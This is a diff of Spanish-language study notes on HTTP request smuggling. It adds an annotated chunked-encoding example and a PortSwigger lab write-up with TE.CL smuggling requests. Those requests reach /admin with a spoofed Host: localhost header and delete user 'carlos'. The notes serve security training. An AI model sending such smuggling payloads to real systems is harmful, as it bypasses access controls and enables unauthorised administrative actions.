@@ -1,6 +1,6 @@
 # HTTP request smugglin 
 
-> El contrabando de solicitudes HTTP es una técnica para interferir con la forma en que un sitio web procesa secuencias de solicitudes HTTP que se reciben de uno o más usuarios.
+> El contrabando de solicitudes HTTP es una técnica para interferir con la forma en que un sitio web procesa secuencias de solicitudes HTTP que se reciben de uno o más usuarios. Cuando un servidor esta presente HTTP intenta evitar ambiguedades y si Content-Length y Trasfer-Encoding estan presentes entonces se supone que se ***invalida*** Content-Lenght.
 
 > Los usuarios envían solicitudes a un servidor front-end (a veces denominado equilibrador de carga o proxy inverso) y este servidor reenvía las solicitudes a uno o más servidores back-end. Este tipo de arquitectura es cada vez más común, y en algunos casos inevitable, en las aplicaciones modernas basadas en la nube. El protocolo es muy simple: las solicitudes HTTP se envían una tras otra y el servidor receptor analiza los encabezados de las solicitudes HTTP para determinar dónde termina una solicitud y comienza la siguiente. En esta situación, es crucial que los sistemas front-end y back-end estén de acuerdo sobre los límites entre las solicitudes. De lo contrario, un atacante podría enviar una solicitud ambigua que los sistemas front-end y back-end interpretan de manera diferente
 
@@ -86,8 +86,20 @@ The bytes after "0d0a0d0a" will be used to calculate the content length. As byte
 
 > https://support.f5.com/csp/article/K36105252
 
-## Transfer-Encoding
+# Manualy calculate Transfer-Encoding
+
 El encabezado Transfer-Encoding especifica la forma de codificación utilizada para transferir de forma segura el cuerpo del payload (en-US) al usuario.
+
+```
+POST /search HTTP/1.1
+Host: normal-website.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked //  dos formas diferentes de especificar dónde termina una solicitud esta es una.
+                           // salto de linea
+b                           // el tamaño del contenido es este pedazo o chunk en formato hex en este caso 11 salto de linea
+q=smuggling                 // el contenido son exactamente 11 bytes salto de linea
+0                           // y termina en cero siempre
+```
 
 ### chunked
 
@@ -311,10 +323,66 @@ x=
 Se borra el usuario carlos y se resuelve el lab
 
 
-# 
+# Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+
+En este laboratorio se puede observar que el front end acepta Trasfer-Encoding y el back en Content-Lenght
+El proposito es el mimos borar el usuario carlos primero se intenta con 
+
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+60
+POST /admin HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+
+Despues se intenta con la cabecera Host: localhost.
+
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+71
+POST /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+```
+Lo cual nos permite entrar al /admin 
 
 
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
 
+87
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+```
+
+Despues ya solo le eliminas notar como se cambio la peticion POST por GET.
 
 
 > https://portswigger.net/web-security/request-smuggling
